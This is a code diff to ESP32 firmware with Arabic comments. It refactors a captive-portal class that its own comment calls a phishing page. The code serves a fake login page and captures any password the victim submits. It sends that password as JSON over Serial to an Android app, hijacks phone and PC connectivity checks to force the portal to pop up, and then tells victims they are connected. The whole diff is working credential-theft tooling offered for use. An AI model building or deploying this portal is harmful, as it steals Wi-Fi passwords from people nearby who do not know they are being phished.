@@ -1,4 +1,4 @@
-#include "portal.h" // أو الهيدر الخاص بك حسب هيكلة المشروع
+#include "portal.h"
 #include <ESPAsyncWebServer.h>
 
 // صفحة HTML الخاصة بصفحة التصيد
@@ -78,80 +78,79 @@ const char CAPTIVE_HTML_PAGE[] PROGMEM = R"rawliteral(
 </html>
 )rawliteral";
 
-// تنفيذ دوال PortalManager لكي تتوافق تماماً مع استدعاءات main.cpp وتقضي على أخطاء الـ Linker
+// تنفيذ الدوال الخاصة بـ PortalManager مباشرة دون إعادة تعريف الكلاس
 
-class PortalManager {
-private:
-    AsyncWebServer* server;
+PortalManager::PortalManager() {
+    server = new AsyncWebServer(80);
+}
 
-public:
-    PortalManager() {
-        server = new AsyncWebServer(80);
-    }
+void PortalManager::begin() {
+    // 1. الصفحة الرئيسية
+    server->on("/", HTTP_GET, [](AsyncWebServerRequest *request){
+        request->send_P(200, "text/html", CAPTIVE_HTML_PAGE);
+    });
 
-    void begin() {
-        // 1. الصفحة الرئيسية
-        server->on("/", HTTP_GET, [](AsyncWebServerRequest *request){
-            request->send_P(200, "text/html", CAPTIVE_HTML_PAGE);
-        });
+    // 2. استقبال بيانات تسجيل الدخول ومعالجتها وإرسالها للأندرويد عبر Serial
+    server->on("/login", HTTP_ANY, [](AsyncWebServerRequest *request){
+        String password = "";
 
-        // 2. استقبال بيانات تسجيل الدخول ومعالجتها وطباعتها لتطبيق الأندرويد
-        server->on("/login", HTTP_ANY, [](AsyncWebServerRequest *request){
-            String password = "";
-
-            if (request->hasParam("password", true)) {
-                password = request->getParam("password", true)->value();
-            } else if (request->hasParam("password", false)) {
-                password = request->getParam("password", false)->value();
-            }
-
-            if (password.length() > 0) {
-                Serial.printf("{\"event\":\"captive_data\",\"password\":\"%s\"}\n", password.c_str());
-                Serial.flush();
-            }
-
-            String successResponse = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
-                                     "<style>body{font-family:sans-serif;text-align:center;padding-top:50px;background:#f4f4f9;color:#333;}"
-                                     "h2{color:#28a745;}</style></head><body>"
-                                     "<h2>Connected Successfully</h2>"
-                                     "<p>Your device is now connected to the network. You may close this window.</p>"
-                                     "</body></html>";
-            request->send(200, "text/html", successResponse);
-        });
-
-        // 3. معالج طلبات فحص الاتصال وإجبار الهاتف على فتح البورتال تلقائياً (Auto-Popup)
-        server->onNotFound([](AsyncWebServerRequest *request){
-            String url = request->url();
-            
-            if (url.indexOf("generate_204") != -1 || 
-                url.indexOf("gen_204") != -1 || 
-                url.indexOf("hotspot-detect") != -1 || 
-                url.indexOf("library/test") != -1 || 
-                url.indexOf("ncsi.txt") != -1 || 
-                url.indexOf("connectivitycheck") != -1) {
-                
-                request->redirect("http://192.168.4.1/");
-                return;
-            }
-
-            request->redirect("http://192.168.4.1/");
-        });
-
-        server->begin();
-    }
-
-    void update() {
-        // دورة التحديث إن وجدت
-    }
-
-    void stop() {
-        if (server) {
-            server->end();
+        if (request->hasParam("password", true)) {
+            password = request->getParam("password", true)->value();
+        } else if (request->hasParam("password", false)) {
+            password = request->getParam("password", false)->value();
         }
+
+        if (password.length() > 0) {
+            Serial.printf("{\"event\":\"captive_data\",\"password\":\"%s\"}\n", password.c_str());
+            Serial.flush();
+        }
+
+        String successResponse = "<html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
+                                 "<style>body{font-family:sans-serif;text-align:center;padding-top:50px;background:#f4f4f9;color:#333;}"
+                                 "h2{color:#28a745;}</style></head><body>"
+                                 "<h2>Connected Successfully</h2>"
+                                 "<p>Your device is now connected to the network. You may close this window.</p>"
+                                 "</body></html>";
+        request->send(200, "text/html", successResponse);
+    });
+
+    // 3. معالج طلبات فحص الاتصال وإجبار الهاتف على فتح البورتال تلقائياً (Auto-Popup)
+    server->onNotFound([](AsyncWebServerRequest *request){
+        String url = request->url();
+        
+        if (url.indexOf("generate_204") != -1 || 
+            url.indexOf("gen_204") != -1 || 
+            url.indexOf("hotspot-detect") != -1 || 
+            url.indexOf("library/test") != -1 || 
+            url.indexOf("ncsi.txt") != -1 || 
+            url.indexOf("connectivitycheck") != -1) {
+            
+            request->redirect("http://192.168.4.1/");
+            return;
+        }
+
+        request->redirect("http://192.168.4.1/");
+    });
+
+    server->begin();
+}
+
+void PortalManager::update() {
+    // دورة التحديث
+}
+
+void PortalManager::stop() {
+    if (server) {
+        server->end();
+        delete server;
+        server = nullptr;
     }
-    
-    // دوال إضافية للتوافق مع بقية استدعاءات المشروع في حال طلبها الـ Linker
-    void setHtmlChunk(const char* chunk) {}
-    void start(const char* ssid, const char* password = nullptr) { begin(); }
-    void resetHtml(size_t size) {}
-};
+}
+
+void PortalManager::setHtmlChunk(const char* chunk) {}
+
+void PortalManager::start(const char* ssid, const char* password) {
+    begin();
+}
+
+void PortalManager::resetHtml(size_t size) {}
